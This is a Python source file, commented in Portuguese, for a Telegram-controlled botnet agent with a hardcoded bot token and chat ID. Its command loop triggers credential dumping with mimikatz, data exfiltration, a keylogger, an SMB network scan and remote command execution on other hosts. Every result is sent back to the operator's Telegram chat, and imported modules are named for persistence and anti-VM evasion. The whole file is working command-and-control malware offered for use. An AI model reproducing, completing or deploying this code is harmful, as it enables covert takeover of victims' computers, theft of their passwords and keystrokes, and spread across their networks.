import requests, time, threading, socket
from core import persistencia, evasao_antivm, keylogger, comandos, condicional, mimikatz, exfiltracao, keylogger, movimento_lateral

TOKEN = '7504792598:AAHN9Cy96poY_6JCKqXTBMUlx08vn8lZPNg'
CHAT_ID = '7314010265'
BOT_ID = socket.gethostname()

# Controle simples para iniciar keylogger uma vez
keylogger_ativo = False

def enviar_mensagem(texto):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': texto})
    except:
        pass

def processar_comando(msg):
    msg = msg.strip()
    if msg == "/start":
        return "Botnet iniciado. Comandos disponíveis: /mimikatz, /exfiltrar, /keylogger, /recon, /exec"
    
    elif msg == "/mimikatz":
        return mimikatz.executar_mimikatz(TOKEN, CHAT_ID)
    
    elif msg == "/exfiltrar":
        return exfiltracao.exfiltrar(TOKEN, CHAT_ID)
    
    elif msg == "/keylogger":
        global keylogger_ativo
        if not keylogger_ativo:
            keylogger.iniciar_keylogger(TOKEN, CHAT_ID)
            keylogger_ativo = True
            return "Keylogger iniciado."
        else:
            return "Keylogger já está rodando."
    
    elif msg == "/recon":
        ips = movimento_lateral.scan_rede()
        if ips:
            texto = "IPs ativos com SMB:\n" + "\n".join(ips)
        else:
            texto = "Nenhum host ativo encontrado."
        return texto
    
    elif msg.startswith("/exec"):
        try:
            # Exemplo: /exec 192.168.1.20 admin senha whoami
            parts = msg.split(" ")
            if len(parts) < 4:
                return "Uso correto: /exec IP usuario senha [comando]"
            ip, usuario, senha = parts[1], parts[2], parts[3]
            comando = " ".join(parts[4:]) if len(parts) > 4 else "whoami"
            return movimento_lateral.exec_remoto(ip, usuario, senha, comando)
        except Exception as e:
            return f"Erro no comando /exec: {e}"

    else:
        return "Comando desconhecido."

def main():
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset + 1}&timeout=30"
            resp = requests.get(url).json()
            if resp["ok"]:
                for update in resp["result"]:
                    offset = update["update_id"]
                    if "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        if str(chat_id) != CHAT_ID:
                            # Ignora mensagens de outros chats (ou filtra)
                            continue
                        texto = update["message"]["text"]
                        resposta = processar_comando(texto)
                        enviar_mensagem(resposta)
        except Exception as e:
            print(f"Erro: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()